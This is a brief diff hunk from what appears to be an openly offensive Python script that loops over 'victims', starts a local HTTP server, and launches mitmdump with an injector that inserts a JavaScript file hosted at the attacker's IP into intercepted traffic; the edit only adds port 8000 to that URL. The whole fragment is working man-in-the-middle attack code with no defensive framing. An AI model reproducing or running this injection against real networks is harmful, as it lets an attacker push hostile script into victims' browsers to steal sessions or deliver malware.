@@ -31,7 +31,7 @@ for victim in victims:
 os.system("python3 httpServer.py &")
 
 # start the mitmproxy
-os.system("mitmdump -s 'injector.py http://" + attacker_ip + "/script.js' -T")
+os.system("mitmdump -s 'injector.py http://" + attacker_ip + ":8000/script.js' -T")
 
 
 '''
